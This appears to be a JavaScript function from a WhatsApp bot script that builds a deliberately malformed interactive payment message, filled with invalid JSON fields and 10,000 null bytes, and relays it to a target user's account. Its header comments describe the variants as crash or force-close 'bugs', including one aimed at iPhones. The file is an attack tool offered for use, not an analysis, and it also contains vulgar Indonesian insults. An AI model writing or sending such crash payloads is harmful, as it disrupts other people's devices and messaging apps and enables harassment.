//FUNCTION BUG NEW BY ALWAYSAQIOO (COLONG YATIM+WA LU GUA BANET MMK)

/*
Bug qioDecvob (khusus fc)
Bug qiocrash (khusus crash)
Bug qiomatador (khusus iponk)
Bug qioexcevier (khusus fc selamanya
*/
require('./indek')
require('./qio')
async function paybug1(userJid) {
var messageContent = generateWAMessageFromContent(userJid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
          "hasMediaAttachment": true,
          'sequenceNumber': '0',
          "jpegThumbnail": ""
          },
          'nativeFlowMessage': {
          "buttons": [
          {
          "name": "review_and_memek",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":🇬🇧👇🇬🇧🥰,\"offset\":100},\"reference_id\":\"🇮🇩⚠️\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":kontol},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":maklu},\"shipping\":{\"value\":😋🙏🔒✔️🤮🙏🔓🙏,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Memek Maklu Kang Colong Anjg\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1📱😆😭5️⃣😭5️⃣8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"🙂‍↕️😏🙂‍↕️😏\":49}]},\"native_payment_methods\":[]}`
          }
         ],
         "messageParamsJson": '\0'.repeat(10000),
        }
        }
      }
    }
  }), {
    'userJid': userJid
  });
await qio.relayMessage(userJid, messageContent.message, {
    'participant': {
      'jid': userJid
    },
    'messageId': messageContent.key.id
  });
  console.log(warna.brightYellow('─「 Bego Amat Cil, belajar dlu sono cara nyolong yang bener😂  」─'))
  }